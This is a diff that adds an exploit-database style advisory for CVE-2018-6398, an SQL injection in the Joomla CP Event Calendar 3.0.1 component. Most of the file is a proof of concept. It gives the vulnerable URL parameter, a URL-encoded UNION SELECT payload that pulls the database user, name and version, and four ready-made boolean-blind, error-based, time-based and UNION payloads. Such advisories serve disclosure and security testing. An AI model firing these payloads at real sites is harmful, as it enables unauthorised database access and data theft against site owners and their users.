@@ -1,0 +1,43 @@
+# # # # #
+# Exploit Title: Joomla! Component CP Event Calendar 3.0.1 - SQL Injection
+# Dork: N/A
+# Date: 30.01.2018
+# Vendor Homepage: http://www.joomlacalendars.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/calendars-a-events/events/cp-event-calendar/
+# Version: 3.0.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-6398
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/index.php?option=com_cpeventcalendar&task=load&id=[SQL]
+# 
+# %2d%31%20%20%2f%2a%21%30%36%36%36%36%55%4e%49%4f%4e%2a%2f%20%2f%2a%21%30%36%36%36%36%53%45%4c%45%43%54%2a%2f%20CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION())%2c%32%2c%33%2c%34%2c%35%2c%36%2c%37%2d%2d%20%2d
+# 
+# Parameter: id (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: option=com_cpeventcalendar&task=load&id=1 AND 6741=6741
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: option=com_cpeventcalendar&task=load&id=1 AND (SELECT 7531 FROM(SELECT COUNT(*),CONCAT(0x716a707671,(SELECT (ELT(7531=7531,1))),0x717a6a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL <= 5.0.11 AND time-based blind (heavy query - comment)
+#     Payload: option=com_cpeventcalendar&task=load&id=1 AND 3954=BENCHMARK(5000000,MD5(0x4573626a))#
+# 
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 7 columns
+#     Payload: option=com_cpeventcalendar&task=load&id=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a707671,0x4a61716b6d59557a4f5a496f7676584d57444e514d4d78626d42546e786d79747350424271687555,0x717a6a7a71),NULL,NULL,NULL-- cJFi
+# 
+# # # # #
